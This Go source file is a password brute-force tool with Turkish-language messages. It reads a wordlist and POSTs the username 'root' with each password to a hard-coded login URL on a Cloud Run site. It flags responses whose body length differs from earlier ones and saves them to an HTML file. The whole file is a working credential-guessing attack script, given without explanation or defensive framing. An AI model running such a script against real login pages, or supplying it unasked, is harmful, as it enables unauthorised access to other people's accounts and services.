package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strconv"
)

func main() {
	var target_url string = "https://root-site-onkdzwesra-ez.a.run.app/"
	var file_name string
	var wordlist_name string

	var firstOld int
	var secondOld int
	var thirdOld int
	var satir int = 0

	var danger string = "[!]"
	var warning string = "[?]"
	var success string = "[+]"
	var info string = "[i]"

	fmt.Print("Enter the wordlist file name: ")
	fmt.Scanf("%s\n", &wordlist_name)

	fmt.Print("Enter the output file name: ")
	fmt.Scanf("%s\n", &file_name)

	file_name = file_name + ".html"

	f, err := os.Create(file_name) // create file
	if err != nil {
		fmt.Println(danger, err) // hata olursa yazdır
	}
	defer f.Close() // close file

	username := "root" // set username

	file, _ := os.Open(wordlist_name)
	fileScanner := bufio.NewScanner(file)

	fmt.Println(success, "İşlem başladı...")
	for fileScanner.Scan() {
		data := url.Values{}
		passwd := fileScanner.Text()
		satir++

		data.Set("username", username) // create data
		data.Set("password", passwd)   // create data

		resp, _ := http.PostForm(target_url, data) // post data
		respBody, err := ioutil.ReadAll(resp.Body) // read body
		if err != nil {
			fmt.Println(danger, err) // hata olursa yazdır
		}
		resp.Body.Close()           // close response body
		respLength := len(respBody) // body length
		if firstOld != respLength {
			if secondOld != respLength && thirdOld != respLength {
				fmt.Printf("\n%v Satır: %v, Veri: %v, Veri Uzunluğu:%v\n", warning, satir, passwd, respLength)

				inWrite := "\n\n+----------------------+ Data:'" + username + ":" + passwd + "' Length:'" + strconv.Itoa(respLength) + "' +----------------------+\n"
				inWrite += string(respBody)

				fmt.Println(info, "Veriler dosyaya yazılıyor...")
				_, err2 := f.WriteString(inWrite) // write data
				if err2 != nil {
					fmt.Println(danger, err2)
				}
				thirdOld = secondOld
			}
			secondOld = firstOld
		}
		firstOld = respLength
	}
	fmt.Println(success, "İşlemler tamamlandı.")

}
